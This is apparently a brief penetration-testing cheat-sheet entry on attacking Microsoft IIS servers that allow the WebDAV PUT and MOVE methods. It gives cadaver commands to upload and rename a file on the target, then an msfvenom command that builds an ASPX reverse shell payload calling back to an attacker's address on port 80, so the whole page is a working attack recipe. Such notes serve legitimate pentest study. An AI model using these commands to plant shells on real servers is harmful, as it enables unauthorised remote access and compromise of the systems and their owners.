# IIS

If HTTP methods such as PUT and MOVE are allowed, we can use cadaver to upload a file and rename it

{% code overflow="wrap" %}
```bash
cadaver $HOSTNAME
put $FILE
move $FILE
# We can use more HTTP methods but these are important for exploiting.

msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.0 LPORT=80 -f aspx -o reverse.aspx
```
{% endcode %}
